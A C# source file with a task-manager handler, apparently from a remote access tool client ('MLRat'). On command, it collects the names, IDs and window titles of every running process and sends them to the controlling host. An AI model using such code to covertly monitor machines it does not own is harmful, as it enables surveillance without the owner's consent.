using MLRat.Client;
using SharedCode.CustomObjects;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class TaskManagerHandler
    {
        static IClientConnection NetworkHost = null;
        public static void SetNetworkHost(IClientConnection connection)
        {
            NetworkHost = connection;
        }

        public static void Handle(object[] data)
        {
            TaskManagerCommand command = (TaskManagerCommand)data[1];

            if (command == TaskManagerCommand.GetProcesses) GetProcesses();

        }

        public static void GetProcesses()
        {
            Process[] allProcs = Process.GetProcesses();
            Process currentProc = Process.GetCurrentProcess();
            string[] ProcessNames = new string[allProcs.Length];
            int[] procIds = new int[allProcs.Length];
            string[] windowText = new string[allProcs.Length];
            bool[] hasWindow = new bool[allProcs.Length];
            for(int i = 0; i < allProcs.Length; i++)
            {
                try
                {
                    ProcessNames[i] = allProcs[i].ProcessName;
                    procIds[i] = allProcs[i].Id;
                    windowText[i] = allProcs[i].MainWindowTitle;
                    hasWindow[i] = allProcs[i].MainWindowTitle != string.Empty;
                }
                catch
                {
                    ProcessNames[i] = "Access denied";
                    procIds[i] = 0;
                    windowText[i] = "Access denied";
                }
            }
            NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ProcessList, ProcessNames, procIds, windowText, hasWindow, currentProc.Id);
        }
    }
}
